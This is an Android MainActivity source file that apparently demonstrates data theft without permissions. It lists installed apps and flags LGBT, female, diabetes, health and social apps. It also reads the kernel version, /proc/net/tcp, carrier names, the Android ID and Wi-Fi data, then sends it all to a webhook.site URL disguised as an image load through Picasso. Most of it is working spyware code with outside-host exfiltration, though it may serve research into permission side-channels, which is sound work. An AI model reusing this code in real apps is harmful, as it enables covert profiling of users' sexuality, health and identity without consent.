package the.least.permissions;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.ImageView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import com.squareup.picasso.Picasso;

import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.BlockingQueue;

public class MainActivity extends AppCompatActivity implements WifiListener {

    private static final String TAG = "MainActivity";

    private ArrayList<String> dataToUpload = new ArrayList<>();
    private boolean flagSocial;
    private boolean flagSingle;
    private boolean flagLgbt;
    private boolean flagFemale;
    private boolean flagDiabetes;
    private boolean flagHealth;
    private Map<Integer, String> appMap = new HashMap<Integer, String>();

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        IntentFilter filter = new IntentFilter(Intent.ACTION_SCREEN_ON);
        filter.addAction(Intent.ACTION_SCREEN_OFF);
    }

    /**
     * when started, the app reads what other apps are installed and other data like the phone model.
     */
    @Override
    protected void onStart() {
        super.onStart();
        stealAppData();
        exfiltrate(readVersion(), readIdentifiers());
    }

    /**
     * every time the app gains focus, it starts a thread reading wi-fi data.
     */
    @Override
    protected void onResume() {
        super.onResume();
        ConnectivityManager connectivityManager = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
        if (connectivityManager != null) {
            NetworkInfo networkInfo = connectivityManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
            if (networkInfo.isConnected()) {
                new WifiSniffer(this).execute(networkInfo.getDetailedState());
            }
        }
    }

    /**
     * before app loses focus, it uploads what data was found
     */
    @SuppressLint("SdCardPath")
    @Override
    protected void onStop() {
        super.onStop();
        if (!dataToUpload.isEmpty()) {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            boolean isScreenOn;
            if (android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                isScreenOn = pm.isInteractive();
            } else {
                isScreenOn = pm.isScreenOn();// deprecated after API 21
            }
            if (isScreenOn) {
                // app stopped but screen is on => some other app has taken over: which one?
                if (flagSocial) {
                    // check for social activity
                    BufferedReader br;
                    try {
                        br = new BufferedReader(new FileReader("/proc/net/tcp"));
                        prepareForUpload("social=" + br.readLine());
                    } catch (FileNotFoundException e) {
                        Log.e(TAG, e.getMessage());
                    } catch (IOException e) {
                        Log.e(TAG, e.getMessage());
                    }
                }
            } else {
                // this app was the last one active before the screen went black
                Log.d(TAG, "The screen is off");
            }
        }
        StringBuilder sb = new StringBuilder("https://webhook.site/5ebd6968-4d2b-4c72-84a4-c3f491311c3e/?noperms&");
        for (String queuedString : dataToUpload) {
            sb.append(queuedString).append('&');
        }
        dataToUpload.clear();
        String request = sb.toString();
        Log.d(TAG, "Uploading: " + request);
        Picasso.get().load(request).error(R.drawable.ic_menu_edit).into((ImageView) findViewById(R.id.edit_button));
    }

    // utilities

    private void exfiltrate(String version, String id) {
        String send = "ver=" + version + "?" + id;
        prepareForUpload(send);
    }

    private String readIdentifiers() {
        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        String operator = "0", sim = "0";
        if (telephonyManager.getPhoneType() == TelephonyManager.PHONE_TYPE_GSM) {
            operator = telephonyManager.getNetworkOperatorName();
            Log.d(TAG, "readIdentifiers: GSM Operator: " + operator);
        } else {
            Log.d(TAG, "readIdentifiers: not GSM");
        }
        if (telephonyManager.getSimState() == TelephonyManager.SIM_STATE_READY) {
            sim = telephonyManager.getSimOperatorName();
            Log.d(TAG, "readIdentifiers: SIM Operator: " + sim);
        } else {
            Log.d(TAG, "readIdentifiers: SIM Not Ready");
        }
        @SuppressLint("HardwareIds") String androidID = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        return "gsm=" + operator + "&sim=" + sim + "&aid=" + androidID;
    }

    private String readVersion() {
        BufferedReader procVersion;
        try {
            procVersion = new BufferedReader(new FileReader("/proc/version"));
        } catch (FileNotFoundException e) {
            return "";
        }
        String kernel;
        try {
            kernel = procVersion.readLine();
        } catch (IOException e) {
            return "";
        }
        return URLEncoder.encode(kernel);
    }

    private void stealAppData() {
        List<PackageInfo> packList = getPackageManager().getInstalledPackages(0);
        StringBuilder send = new StringBuilder();
        for (int i = 0; i < packList.size(); i++) {
            PackageInfo packInfo = packList.get(i);
            if ((packInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                String appName = packInfo.applicationInfo.packageName;
                flagSocial |= InstalledAppUtils.isSocial(appName);
                flagLgbt |= InstalledAppUtils.isLgbt(appName);
                flagFemale |= InstalledAppUtils.isFemale(appName);
                flagDiabetes |= InstalledAppUtils.isDiabetes(appName);
                flagHealth |= InstalledAppUtils.isHealth(appName);
                send.append("|").append(appName);
                appMap.put(packInfo.applicationInfo.uid, appName);
                Log.i(TAG, "stealAppData - installed app: " + i + " as uid " + appName);
            }
        }
        prepareForUpload("apps=" + send.toString());
    }

    public void prepareForUpload(String string) {
        dataToUpload.add(string);
        Toast.makeText(
            this,
            "Data was queued for upload.",
            Toast.LENGTH_SHORT
        ).show();
    }

    @Override
    public void onSniffed(String data) {
        prepareForUpload("wifiData=" + data);
    }
}